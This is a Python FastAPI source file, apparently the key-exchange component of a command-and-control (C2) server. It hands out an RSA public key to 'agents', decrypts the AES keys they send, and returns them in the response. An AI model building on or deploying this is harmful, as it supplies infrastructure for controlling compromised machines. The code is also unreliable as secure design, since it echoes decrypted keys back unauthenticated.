######################################################################################################################################################################################################################
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
######################################################################################################################################################################################################################

from fastapi import FastAPI, HTTPException, Request
from pydantic import BaseModel
import base64
import logging
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

app = FastAPI()
logging.basicConfig(filename="c2_server.log", level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

# Generate RSA key pair
RSA_KEY = RSA.generate(4096)
PUBLIC_KEY_PEM = RSA_KEY.publickey().export_key().decode()
PRIVATE_KEY = RSA_KEY

class KeyExchangeRequest(BaseModel):
    AgentID: str
    EncAESKey: str

@app.get("/public_key")
def get_public_key():
    """Send public key to agents."""
    logging.info("Public key requested")
    return {"PublicKey": PUBLIC_KEY_PEM}

@app.post("/exchange_key")
async def exchange_key(request: Request):
    """Receive encrypted AES key and decrypt it."""
    try:
        logging.info("exchange_key endpoint called")
        req_json = await request.json()
        logging.info(f"Request JSON: {req_json}")

        enc_key_b64 = req_json.get("EncAESKey")
        if enc_key_b64 is None:
            logging.error("EncAESKey not found in request")
            raise HTTPException(status_code=400, detail="EncAESKey not found in request")

        enc_key = base64.b64decode(enc_key_b64)
        logging.info(f"Received encrypted key length: {len(enc_key)} bytes")

        # Ensure correct RSA key size
        if len(enc_key) != 512:  # 4096-bit RSA results in 512-byte encrypted key
            logging.error(f"Invalid encrypted key length: {len(enc_key)}")
            raise HTTPException(status_code=400, detail="Invalid encrypted key length")

        cipher_rsa = PKCS1_OAEP.new(PRIVATE_KEY)
        aes_key = cipher_rsa.decrypt(enc_key)
        logging.info(f"Decrypted AES Key Length: {len(aes_key)} bytes")

        return {"Status": "Success", "AESKey": base64.b64encode(aes_key).decode()}
    except HTTPException as http_err:
        logging.error(f"HTTP Exception: {http_err.detail}")
        raise http_err
    except Exception as e:
        logging.error(f"General Exception: {str(e)}")
        raise HTTPException(status_code=500, detail=f"Key exchange failed: {str(e)}")

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)


